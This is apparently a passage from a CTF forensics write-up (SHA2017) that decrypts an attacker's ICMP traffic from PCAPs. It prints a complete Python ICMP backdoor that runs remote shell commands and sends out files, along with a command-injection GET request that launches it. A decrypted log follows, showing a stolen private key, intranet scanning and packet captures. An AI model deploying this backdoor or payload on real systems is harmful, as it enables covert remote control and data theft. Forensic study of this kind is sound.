threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()cipher = AESCipher(sys.argv[1])while True: try: pkts = sniff(filter=\"icmp\", timeout =5,count=1) for packet in pkts: if str(packet.getlayer(ICMP).type) == \"8\": input = packet[IP].load if input[0:len(magic)] == magic: input = input.split(\":\") data = cipher.decrypt(input[1]).split(\":\") ip = packet[IP].src if data[0] == \"command\": output = run_command(data[1]) send_ping(ip, magic, \"command:&#123;&#125;\".format(output)) if data[0] == \"getfile\": #print \"[+] Sending file &#123;&#125;\".format(data[1]) get_file(ip, magic, data[1]) except: passGET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1 The hacker used AES to encrypt his commands! And we know the password he used! which we can get it from the GET HTTP request! which was K8djhaIU8H2d1jNb “GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1”. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#!/usr/bin/env pythonimport base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESfrom scapy.all import *BS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()cipher = AESCipher(sys.argv[1])while True: try: pkts = sniff(filter=\"icmp\", timeout =5,count=1) for packet in pkts: if str(packet.getlayer(ICMP).type) == \"8\": input = packet[IP].load if input[0:len(magic)] == magic: input = input.split(\":\") data = cipher.decrypt(input[1]).split(\":\") ip = packet[IP].src if data[0] == \"command\": output = run_command(data[1]) send_ping(ip, magic, \"command:&#123;&#125;\".format(output)) if data[0] == \"getfile\": #print \"[+] Sending file &#123;&#125;\".format(data[1]) get_file(ip, magic, data[1]) except: pass With all this information we need to decrypt the packages from the other PCAPs, which contains the communication between the hacker and the server, we can use the hackers script and password! first lets extract the encrypted data with tshark! 123kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse02.pcap -Tfields -e data | xxd -r -p &gt; encrypted1kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse03.pcap -Tfields -e data | xxd -r -p &gt; encrypted2 Now modifing the scrypt so we can decrypt our IMCP encrypted data: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESimport binasciiimport reBS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = \"SHA2017\"key2=\"K8djhaIU8H2d1jNb\"stri=\"9FEEhLIvHpDPM4qwDwPQVxuasHbiFnI6AjSY6YNDlzcRZX7T+R6azOsOHIXSTsQJFY6KWC57M7c50/Y8VoDblzthDZEAgvOglXNj5wC78R3+euE2enPioadbLZ4K2bwG8UAxdIX8sH7NAmC9LNVuluqd2TYgDss20VNwd1rJ7vmkrt55gXvCWdOieQarMbMZorDqvcRrPRJsNae1x8CHY/ukToeYt8w4T16BrqdN9ZJK+NFVxDddHjjfXCtwF2eqVZ+qZhYiDPAcy1DcQZEWJeRz+R5m98WsLqH2gJvpYY3T6h1JuTTJUDfhoqeTvrRF/z9nsGCaJQZjKY3EDrdvCQ==\"class AESCipher: def __init__( self, key ): self.key = key def encrypt( self, raw ): raw = pad(raw) iv = Random.new().read( AES.block_size ) cipher = AES.new( self.key, AES.MODE_CBC, iv ) return base64.b64encode( iv + cipher.encrypt( raw ) ) def decrypt( self, enc ): enc = base64.b64decode(enc) iv = enc[:16] cipher = AES.new(self.key, AES.MODE_CBC, iv ) return unpad(cipher.decrypt( enc[16:] ))def run_command(cmd): ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT) output = ps.communicate()[0] return outputdef send_ping(host, magic, data): data = cipher.encrypt(data) load = \"&#123;&#125;:&#123;&#125;\".format(magic, data) time.sleep(1) sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)def chunks(L, n): for i in xrange(0, len(L), n): yield L[i:i+n]def get_file(host, magic, fn): time.sleep(1) data = base64.urlsafe_b64encode(open(fn, \"rb\").read()) cnt = 0 icmp_threads = [] for line in chunks(data, 500): t = threading.Thread(target = send_ping, args = (host,magic, \"getfile:&#123;&#125;:&#123;&#125;\".format(cnt,line))) t.daemon = True t.start() icmp_threads.append(t) cnt += 1 for t in icmp_threads: t.join()# cipher = AESCipher(sys.argv[1])# while True:# try: # pkts = sniff(filter=\"icmp\", timeout =5,count=1)# for packet in pkts:# if str(packet.getlayer(ICMP).type) == \"8\": # input = packet[IP].load# if input[0:len(magic)] == magic:# input = input.split(\":\")# data = cipher.decrypt(input[1]).split(\":\")# ip = packet[IP].src# if data[0] == \"command\":# output = run_command(data[1])# send_ping(ip, magic, \"command:&#123;&#125;\".format(output))# if data[0] == \"getfile\":# #print \"[+] Sending file &#123;&#125;\".format(data[1])# get_file(ip, magic, data[1])# except:# pass# break# print(final)#for i in range(0,301):# print(i, dicio[str(i)])# for k,v in dicio.iteritems(): # print(k, base64.urlsafe_b64decode(v))# print(base64.urlsafe_b64decode(final)) # if outp not in lis: # # print(outp) # print(numb) # lis.append(outp) # lis = sorted(lis) # for it in lis: # print(it)dicio = &#123;&#125;lis = []n = AESCipher(key2)infile1=\"encrypted1\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin),2): outp = n.decrypt(strin[i]) print outp Running the script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.pycommand:ls -lacommand:total 16drwxr-xr-x 3 root root 4096 Jul 26 09:36 .drwxr-xr-x 3 root root 4096 Jul 26 03:45 ..drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.phpcommand:idcommand:uid=0(root) gid=0(root) groups=0(root)command:idcommand:uid=0(root) gid=0(root) groups=0(root)command:idcommand:uid=0(root) gid=0(root) groups=0(root)command:ls -la /rootcommand:total 32drwx------ 5 root root 4096 Jul 27 07:27 .drwxr-xr-x 22 root root 4096 Apr 18 05:43 ..-rw------- 1 root root 3228 Jul 26 06:44 .bash_history-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwxr-xr-x 2 root root 4096 Jul 27 09:11 certsdrwxr-xr-x 2 root root 4096 Jul 26 03:47 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 Jul 27 07:27 .sshcommand:ls -la /root/certscommand:total 16drwxr-xr-x 2 root root 4096 Jul 27 09:11 .drwx------ 5 root root 4096 Jul 27 07:27 ..-rw-r--r-- 1 root root 989 Jul 27 07:23 intranet.crt-rw-r--r-- 1 root root 916 Jul 27 07:23 intranet.keycommand:cat /root/certs/intranet.crtcommand:-----BEGIN CERTIFICATE-----MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNVBAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQwEgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBnbWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYDVQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEUMBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZAZ21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRnn/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXKhCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgKhNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7MV70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAWrjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDuSRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nXDkYKgl7BR0a72yTuLAc0GA==-----END CERTIFICATE-----command:cat /root/certs/intranet.keycommand:-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=-----END PRIVATE KEY-----command:cat /root/certs/intranet.keycommand:-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=-----END PRIVATE KEY-----command:cat /etc/hostscommand:127.0.0.1 localhost127.0.1.1 ubuntu# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters10.29.0.1 router192.168.1.1 router192.168.1.2 intranetcommand:nohup nmap intranet &gt; /tmp/intranet.nmapcommand:command:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:cat /tmp/intranet.nmapcommand:Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDTNmap scan report for intranet (192.168.1.2)Host is up (0.00010s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open httpsMAC Address: 00:0C:29:3D:FD:B0 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.52 secondscommand:curl -k https://intranet/command: % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 456 100 456 0 0 4871 0 --:--:-- --:--:-- --:--:-- 4903&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Unauthorized&lt;/h1&gt;&lt;p&gt;This server could not verify that youare authorized to access the documentrequested. Either you supplied the wrongcredentials (e.g., bad password), or yourbrowser doesn't understand how to supplythe credentials required.&lt;/p&gt;&lt;hr&gt;&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at intranet Port 443&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;command:tcpdump -Dcommand:1.ens33 [Up, Running]2.ens39 [Up, Running]3.any (Pseudo-device that captures on all interfaces) [Up, Running]4.lo [Up, Running, Loopback]5.nflog (Linux netfilter log (NFLOG) interface)6.nfqueue (Linux netfilter queue (NFQUEUE) interface)7.usbmon1 (USB bus number 1)8.usbmon2 (USB bus number 2)command:tcpdump -i usbmon2 -w /tmp/usb.pcapcommand:tcpdump host intranet -w /tmp/intranet.pcap As we can see we can extract alot of usefull Information from here, we now have the RSA private key used for TLS encryption and the certificate from the companies intranet website, the last 2 commands we could see that the hacker actually started two tcpdumps initiating the captures and one of them is a USB capture! maybe this will be useful latter!Usefull data extracted: command:cat /root/certs/intranet.crtcommand:—–BEGIN CERTIFICATE—–MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNVBAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQwEgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBnbWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYDVQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEUMBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZAZ21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRnn/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXKhCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgKhNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7MV70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAWrjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDuSRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nXDkYKgl7BR0a72yTuLAc0GA==—–END CERTIFICATE—–command:cat /root/certs/intranet.keycommand:—–BEGIN PRIVATE KEY—–MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqEKjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNEpXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoWBofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVPdYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQOHaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQIwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoaps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ERiuSWkHY6ll1V1m0=—–END PRIVATE KEY—–command:tcpdump -i usbmon2 -w /tmp/usb.pcapcommand:tcpdump host intranet -w /tmp/intranet.pcap Now doing the same thing for the 2nd PCAP capture by adding this to the previous backdoor.py script: 123456789infile1=\"encrypted2\"with open(infile1) as f: strin = f.read().split('SHA2017:') strin = strin[1:] for i in range(0,len(strin)): outp = n.decrypt(strin[i]) print outp 123456789kinyabitch@Debian ~/D/H/c/sha2017&gt; python back.pygetfile:/tmp/intranet.pcapgetfile:22:xMWknTPeWuv2HY5z-Tp3Th8wX049inFKvUYvyQhSnuWRsJ8XzXXMYRfYezTcfq9rVFulD0i2Etj8CN3CMylyEVucEymaXhAHKJeR134iXZXUGgFFEzT8tBp8TTPF9cH0webjPbT3NYAxdcM1Wosa6PQD4Cun6osJb5WXuXQ0hZQLKOEx3s_cDoIR2hQmLNbb7lslfPvGEB79Ti_j-CahSlhI8Dbw5ON4yMeCqMMsuPc45ZAAZ8AXWi_CKGLgOvRGJHjMt7ML7MuskilBFw3g0n6vg2nugnqLNLftwWZh8CTvwiRNjNgEATCsNg1RNELnu3n_CXb_Djwlzbsei9zXQPQKPnmdHwucaHNRX51Z5gGEaIxXcjqRyNAGYHVqsTy4BbM32F_-dd1LSKOorBBGoXQLWfKGYHeb1m271eBchjv-JWWFpzK-yHztsmZn2At3i4T_vbuW72zUj3BvoerDO-srr6RKI-4UGrwzbEpjW5PNXq2FmYeKHt5hXT4EhBTgQOXxCvjtS_LIGkPWX1S36x2xBj87JdsRpo6UqrYWrDkDVycbksITiqo7EjNu-bvmHGbxO20cSUxMqHSgbA6PmkYdKPtR_AyjZreMEIMnnw_CmD0svSTpN4NrmLe-g4qUwYj4BENz_dSmLyvN7IYnoCcVwEACDyDBjv-Yg2PY6NUBARI68jWLdmHePchpYWXS3ZKdrt1eycVErN6YhJquGOVpfY9S4_1GenYWRY8in2MeK1105Y2eBKmxWIvZ8f8iW8EGsqAIeAZ0MmJUphs4Ibp-54z1dyRUgetfile:3:8XB7Q94TDBClV8w4qhq69z3FZYrv8t2WgEKqgXrWdlHdlAFX8ALVsMhCJIBkRaym0tYdVp1SG4MaZR4Tss3uWqkUHUP2IHv2mxW9kJtXQcCFacZu6BB6WbVWAABCAAAAQgAAAAAMKUT6VQAMKT39sAgARQAANPb5QABABsB2wKgBAsCoAQEBu8YiHIz10SeSnX2AEADzDMEAAAEBCAoAJQRCAWpAmegQelnOVgAAjQAAAI0AAAAADCk9_bAADClE-lUIAEUAAH_bZ0AAQAbbvcCoAQHAqAECxiIBuyeSnX0cjPXRgBgA8YPFAAABAQgKAWpAowAlBEIUAwMAAQEWAwMAQGxEpdaDTXP8knA4zCtiwo73wxpiSMwEg4mUp0JHTM5EVi8fDHmJwxa4h0XRCtUMYW1ku3J8B2mDM4-Be7yzVgXoEHpZwVcAAEIAAABCAAAAAAwpRPpVAAwpPf2wCABFAAA09vpAAEAGwHXAqAECwKgBAQG7xiIcjPXRJ5KdyIAQAPMMbAAAAQEICgAlBEIBakCj6BB6WWhYAABcAQAAXAEAAAAMKUT6VQAMKT39sAgARQABTvb7QABABr9awKgBAsCoAQEBu8YiHIz10SeSnciAGADzZFwAAAEBCAoAJQRCAWpAoxYDAwDKBAAAxgAAASwAwAgdhAXn_d9KSZnZsG-gE9lS8acf1BQiUuNF04t4gevS8ICJtSUIJdGsE-qc2tSvQnLimi0T1iSzd47KHZC4nPZt8UmAPz8CvuPkoG2nSNnhtH7aG3vuLtigzX4okzcPOGpRgetfile:15:TcpH8DKbQqyDTZP90vOPC7ZroVI7FBLP3tehUVdCsB5kcVOtOgwoeNuBDLMQwHANdbwLTIcc8rWzDtchd96wrcnYimMMVXom7hJFk9CYIvLi1AjgVnUmgijI_ZAvr768ZkMUK9zVD1CWi7x1yw-7a3r9XPaQAx4C_VXxF42RQ7lofpm0NeTW_RQddZVBmc7JRGHSyhhgvnPK9AvSftJCCR2w4U7ivYo3uXfyVBjkj2OnMPWtUeqWQxEMSVPnTp8pQ7CHG0ZhHzowGnNued80Q9s3cR5Dkb2EeAVtwoWObjMziRAuwahOsO88dbD0mOFbJMPNCQst5qOv0KkgXc4ArGuRdj3DqLdqZboIsRIFwk1BKxHoaBedqa8F8GR2t1RZ-xR31I5RSnJrJSn-v2ktPLitzNW5K46Ors604DI6pwH3GKv1moTI-Bc_S54n1WATXNYWBcE5T8_BxHPB6ezfXuuJK-Epgfu5UDMwkRCS84b0R5GT4gYdWLqOvIF0bJrLI1OgDT-ODRNIt_Ehq3jnXlV0gIwLr0nWLzGjDh4dhGdvNC1kylYtkzta6L-eBcnkDjKhyWMZa2pL6NN5iF2RaoKswfm_ZmBEygpY0s8VlBFf0Ut7s6D1vyUNiNEGwR8LZ13L4rxE4Cz51rFPeKFO80yWeYtXEyCz7idxVoT9cp_U8ospLrMcmalnXvZL4OGPzwT7G_dpZoZ6tMYRBKwgSn1KuyvmGlY9VGyQk16PqgpAk09-tmwlYJeEhPQGlrx-JpW6agdmeibUwsMZ0-oYJBhD0cvVwyOtgetfile:13:GA1QBh84hcfGb0cIr9PNPIVMe6FUmD-x98FH5mTW_8LsuTXYhYixTcRrJXFHr1D7NuQynU669tClrXvJsQO-14bI-5v0gG8rlpuDR2L2TdfeyFhxcoPgLKuFBTAGTZkt-6I4hBZaOY3hdFmITNTH-ch29k2E8SY5M9F-KU17oyQ8Kv2J9qbceSWRyCO0dVhJq2oOVvoJzhe2bWwQSHhlPEXy20onc7fz7E58Jw-rftZqGAuQWpcnobRrFlDPLXE2UI3pU2TXi0Wzg8teEOLpb7TDA87tA6EgOqV0tSCL0C8qEI8Fv6nEBiSI1zXGfzzmY3lO6P3kNZnOV6VXTF521So8XreKqd2vNYrgNpr-IljhTLZ0HMmHn6nHlvPWfJC-MswWe41ztWWQ0-LuhvMO8MR4Yl9bpEKwJ5pF0igdOPc0hY5Finn8rTSgAGuhJYFDniX79dhdam6Mi17TAVzw1Rhnp9qGHpXpRArXk_hg5dGNSfmJe4AktaOFqHeOmpa15QLc5wZm7RTvsXYN7-EhAHWDPg7ighLZipwy54nIQcztZM4mXzRAqoIWSJb-G5IxgVRZxhAs_4db4cG4c_pNHNxNh7m3romVsiPm9zmkU2Em0Qf_suCCDsGZSN1xFUJKBtn-W0bzyGqF2dNvWuG2UKT2mTbZ3jnEEcyRp-vyfsXDaKaSNxH1dvEo8_H7L3nOsi_jkB6YwKr0_dgcSclcOx_vYkvqRq9qrL5UMsE_s2ZnjTXC46CFLJecVfRBElmjOevT4MnC4GadhYJhwaEWUEuBh8Yvh4B1getfile:165:cHurdwdnjePy6Xa5SBJU_Mbe1VPdwEuXvCW1XXCaId6Y09yNKbwX0W3KPWiTJ_ZgDoSKci1FZs9sK9gFobVoTOMBicG6atQrQ5TuoL-Er2T8HDGkhComD0AfHzgxHQRy5LbcUsRpMvLLJfsv0ULnwmfjcmk6RWT1IChIG7gUxie3xVnh9lFiOZlVFxFz_NB1JPlWpTqV-8c_tFM9tSk4ud7u4lMdjPgKPO-5eknyZiT8g5WbwDqteDdSuRAfYTl0A0EoEBqNr3wiRTxJJlhGVCWX70ki5CDNCNKMlK9YifFey6W2DMv4_5m616CWgLUNJTeowqqHWA2INCeLrn-dHZi-ADsKHNYoxEqIrJlpZCiUM5L-rOC_TtQ6COT7Aro7kaH1qdQkwgygg2qP6_Xe5mFO4IOMFkcx-51kDyjtfHUGBx2veXXEDfAScnKY9GY_905jJafZ9J8vRfeszHiD0quOv0edGw8NbKp3_pk2nL2Ey-vCIcm4lR0WXOFuOmwj67o6mk_cq2n7axOkJ8gcEc61AqJ7LzZbJFr0_b3bnaZzkXuKF_IokNRQJDpD1WfLkI_ba8Q3u2d8nui9ljBWs7VzwAl8dR1iH4QtIIturGVQEIR8jA3mn1evUTQvFjA-BN2nlOmXqyjoXU0HcaOC53Vj2d1r_J_64CmdAnlWJ-2aeG3dCoP0fYYxvKKpI1g6WXCX_Li701DtBTl6Hnp6ICHW7GEqxK96H0BfB_Sb6UQFa_9ScfbNd3ohC9xxYiiGSssqHiHkiAJ0vfYXSZYMs9YeTpSA273k...Truncated... We have alot of lines, the first line of the output gives us an hint of what are all those lines and we can see “getfile:/tmp/intranet.pcap” so if we extract all those strings after getfile:0:%s to the getfile:301:%s that string is enconded with base64 so we just needed to join them all and decode it since tshark is duplicating our data we actually had to extract 4 of them, but in reality it’s actually only two the intranet.pcap and the usb.cap (and yes! remember the IMCP decrypted packages? the hacker actually started 2 tcpdump commands!).Our final python script will be: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149import base64import sysimport timeimport subprocessimport threadingfrom Crypto import Randomfrom Crypto.Cipher import AESimport binasciiimport reBS = 16pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)unpad = lambda s : s[0:-ord(s[-1])]magic = 